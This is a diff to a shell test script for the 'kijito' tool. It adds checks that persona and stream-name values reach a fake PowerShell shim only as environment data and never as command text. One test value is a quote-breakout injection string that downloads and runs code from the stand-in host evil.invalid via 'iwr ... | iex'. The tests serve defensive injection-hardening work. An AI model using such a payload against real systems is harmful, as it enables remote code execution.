@@ -61,6 +61,8 @@ cat > "$WIN/powershell.exe" <<'SHIM'
 # Fake PowerShell: answer the Win32_Process count the caller asked for. Records every query so the test
 # can assert WHAT was asked (the tail.exe anchor, the stream's basename).
 printf '%s\n' "$*" >> "${PS_LOG:-/dev/null}"
+# A value the caller passed as DATA (never in the command text) - logged on its own line (MEDIUM-2).
+printf 'KIJITO_PS_ARG=%s\n' "${KIJITO_PS_ARG:-}" >> "${PS_LOG:-/dev/null}"
 [ -n "${FAKE_PS_GARBAGE:-}" ] && { echo "Get-CimInstance : Access denied"; exit 1; }
 case "$*" in
   # The LIST query (kijito_stream_consumers) asks for "<pid> <age-seconds>" per tail.exe.
@@ -99,6 +101,28 @@ out=$(FAKE_TAIL=1 lib_call "$WIN" kijito_stream_consumed "/c/Users/j/.cache/kiji
 if grep -q "tail.exe" "$PS_LOG" && grep -q "events.praetor.ndjson" "$PS_LOG"; then
   grn "consumer: the query is anchored on tail.exe AND this stream's basename"
 else red "consumer query lacks the tail.exe anchor or the basename: $(cat "$PS_LOG")"; fi
+unset PS_LOG
+
+# ── MEDIUM-2 (river's 0.2.11 review): a persona is DATA, never PowerShell code ──────────────────────
+# .kijito_persona comes from whatever repo the user cloned, so a marker carrying a quote must not be able to
+# break out of the Where-Object filter. The shim cannot evaluate PowerShell, so assert the contract instead:
+# the hostile string never appears in the command text and reaches PowerShell only as $env:KIJITO_PS_ARG.
+export PS_LOG="$_RUNTMP/ps-hostile.log"; : > "$PS_LOG"
+EVIL="x' -or (iwr https://evil.invalid|iex) -or 'y"
+lib_call "$WIN" kijito_producer_covers "$EVIL" >/dev/null
+cmdtext=$(grep -v '^KIJITO_PS_ARG=' "$PS_LOG")
+if [ -z "$cmdtext" ]; then red "producer_covers sent no PowerShell query - this check measured nothing"
+elif grep -qF "iwr https://evil.invalid" <<<"$cmdtext"; then red "a hostile persona reached the PowerShell COMMAND TEXT: $cmdtext"
+elif grep -qxF "KIJITO_PS_ARG=$EVIL" "$PS_LOG"; then grn "a hostile persona reaches PowerShell only as data (\$env:KIJITO_PS_ARG), never as code"
+else red "the persona was not passed as \$env:KIJITO_PS_ARG: $(cat "$PS_LOG")"; fi
+# LOW-3: --persona is matched as a WHOLE, escaped argument (riverbank must not cover river).
+if grep -qF "[regex]::Escape(\$env:KIJITO_PS_ARG)" <<<"$cmdtext" && grep -qF "(\s|\$)" <<<"$cmdtext" && ! grep -qF "*--persona" <<<"$cmdtext"; then
+  grn "the Windows --persona match is whole-argument and regex-escaped (no '*--persona <p>*' substring)"
+else red "the Windows --persona match is still a substring or unescaped: $cmdtext"; fi
+: > "$PS_LOG"
+lib_call "$WIN" kijito_stream_consumed "/x/events.a'b.ndjson" >/dev/null
+if grep -qF "a'b" <<<"$(grep -v '^KIJITO_PS_ARG=' "$PS_LOG")"; then red "a stream name reached the consumer query's command text"
+else grn "the consumer query passes the stream name as data too"; fi
 unset PS_LOG
 out=$(FAKE_TAIL=0 lib_call "$WIN" kijito_stream_consumed "/x/events.praetor.ndjson")
 [ "$out" = "rc=1" ] && grn "consumer: no tail.exe => not consumed (1)" || red "tail count 0 gave $out"
